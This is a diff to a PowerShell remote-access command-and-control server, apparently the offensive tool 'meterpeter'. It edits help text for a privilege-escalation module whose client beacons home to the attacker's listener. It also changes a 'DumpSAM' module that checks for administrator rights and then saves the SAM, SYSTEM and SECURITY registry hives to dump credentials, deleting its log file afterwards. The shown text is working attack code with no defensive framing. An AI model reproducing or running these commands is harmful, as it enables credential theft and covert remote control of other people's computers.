@@ -863,9 +863,9 @@ While($Client.Connected)
       {
         write-host "`n   Requirements" -ForegroundColor Yellow;
         write-host "   ------------";
-        write-host "   Attacker needs to input the delay time (seconds) for Client";
-        write-host "   to beacon home after the privilege escalation, and restart";
-        write-host "   meterpeter.ps1 Server (Listenner) to recive the connection.";
+        write-host "   Attacker needs to input the delay time (in seconds) for the Client";
+        write-host "   to beacon home after privilege escalation. Attacker also needs to exit";
+        write-host "   and put meterpeter in listenner mode to be abble to catch the connection.";
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
         write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
@@ -1399,7 +1399,7 @@ While($Client.Connected)
       If($choise -eq "DumpSAM" -or $choise -eq "sam")
       {
         write-host " Dump Remote-Host SAM/SYSTEM/SECURITY Remote Credentials." -ForegroundColor Blue -BackgroundColor White;
-        write-host " [sam|system|security] Remote Dump Directory: '$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
+        write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
         $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
       }
       If($choise -eq "Return" -or $choice -eq "return" -or $choise -eq "cls" -or $choise -eq "Modules" -or $choise -eq "modules" -or $choise -eq "clear")
